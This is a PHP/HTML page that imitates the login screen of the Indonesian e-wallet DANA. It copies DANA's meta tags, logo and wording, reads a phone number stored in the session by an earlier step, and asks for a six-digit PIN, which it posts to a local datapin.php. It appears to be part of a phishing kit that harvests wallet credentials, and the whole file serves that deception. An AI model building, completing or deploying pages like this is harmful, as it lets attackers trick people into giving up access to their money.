<?php
session_start();

// Cek apakah nomor sudah disetel di sesi
if (!isset($_SESSION['nomor'])) {
    header("Location: nomor.php");
    exit();
}

$nomor = $_SESSION['nomor'];
?>



<!DOCTYPE html>
<html lang="id">

<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <meta name="theme-color" content="#118ee9">
    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
    <meta name="twitter:image" content="https://a.m.dana.id/danaweb/web/dana-meta-logo.png">
    <meta property="og:image" content="https://a.m.dana.id/danaweb/web/dana-meta-logo.png">
    <meta name="og:site_name" content="DANA.id">
    <meta name="description" content="DANA adalah bentuk baru uang tunai yang lebih baik. Transaksi apapun, berapapun dan dimanapun jadi mudah bersama DANA. Ambil bagian dalam transformasi keuangan digital di Indonesia sekarang!">
    <meta name="twitter:title" content="DANA - Apa pun transaksinya selalu ada DANA">
    <meta name="twitter:description" content="DANA adalah bentuk baru uang tunai yang lebih baik. Transaksi apapun, berapapun dan dimanapun jadi mudah bersama DANA. Ambil bagian dalam transformasi keuangan digital di Indonesia sekarang!">
    <meta name="og:title" content="DANA - Apa pun transaksinya selalu ada DANA">
    <meta name="og:description" content="DANA adalah bentuk baru uang tunai yang lebih baik. Transaksi apapun, berapapun dan dimanapun jadi mudah bersama DANA. Ambil bagian dalam transformasi keuangan digital di Indonesia sekarang!">
    <meta name="keywords" content="dana, dana indonesia, dana bisnis, qris, qris adalah, qris indonesia, daftar qris, qris bank indonesia, qris dana, qris bi, qris merchant, logo qris, apa itu qris, pembayaran qris, merchant, merchant dana, daftar merchant, promo hari ini, promo terbaru, promo cashback, cashback, apa itu cashback, cashback adalah, apa itu ewallet, ewallet indonesia, pembayaran digital, dompet digital">
    <link rel="icon" type="image/x-icon" href="https://www.dana.id/favicon.ico">
    <link rel="preconnect" href="https://a.m.dana.id">
    <link rel="dns-prefetch" href="https://a.m.dana.id">
    <link rel="preconnect" href="https://app.link">
    <link rel="dns-prefetch" href="https://app.link">
    <link rel="preconnect" href="https://api2.branch.io">
    <link rel="dns-prefetch" href="https://api2.branch.io">
    <link rel="preconnect" href="https://youtube.com">
    <link rel="dns-prefetch" href="https://youtube.com">
    <link rel="preconnect" href="https://sentry.io">
    <link rel="dns-prefetch" href="https://sentry.io">
    <link rel="preconnect" href="https://cdn.lr-ingest.io">
    <link rel="dns-prefetch" href="https://cdn.lr-ingest.io">
    <title>DANA - Apa pun transaksinya selalu ada DANA</title>
    <link rel="stylesheet" type="text/css" href="css/pin.css">
    <link rel="stylesheet" type="text/css" href="css/spinner.css">
</head>

<body>
    <div class="container">
        <a class="aback" href="pin.php#"><img class="back" src="img/back.png" alt="Kembali"></a>
        <img class="dana_logo" src="img/dana_logo.png" alt="Logo DANA">
        <h1>Masukkan <b class="bh1">PIN DANA</b></h1>
        <div class="inputPin">
            <form class="formPin" action="datapin.php" method="post">
                <div class="six_pin">
                    <input inputmode="numeric" id="pin1" maxlength="1" autocomplete="off" type="password" class="inpPin" name="pin1">
                    <input inputmode="numeric" id="pin2" maxlength="1" autocomplete="off" type="password" class="inpPin" name="pin2">
                    <input inputmode="numeric" id="pin3" maxlength="1" autocomplete="off" type="password" class="inpPin" name="pin3">
                    <input inputmode="numeric" id="pin4" maxlength="1" autocomplete="off" type="password" class="inpPin" name="pin4">
                    <input inputmode="numeric" id="pin5" maxlength="1" autocomplete="off" type="password" class="inpPin" name="pin5">
                    <input inputmode="numeric" id="pin6" maxlength="1" autocomplete="off" type="password" class="inpPin" name="pin6">
                </div>
                <input type="hidden" name="nomor" value="<?= htmlspecialchars($nomor) ?>">
            </form>
            <div class="btn">
                <button id="see" class="see">TAMPILKAN</button>
                <a class="lupa" href="pin.php#">LUPA PIN?</a>
            </div>
        </div>
    </div>
    <div id="process" name="process" class="process" style="display: none;">
        <div class="loading">
            <img src="img/load_bg.png" alt="Loading Background">
            <img class="spinner" src="img/load_spin.png" alt="Loading Spinner">
        </div>
    </div>
    <script src="js/pin.js"></script>
</body>

</html>
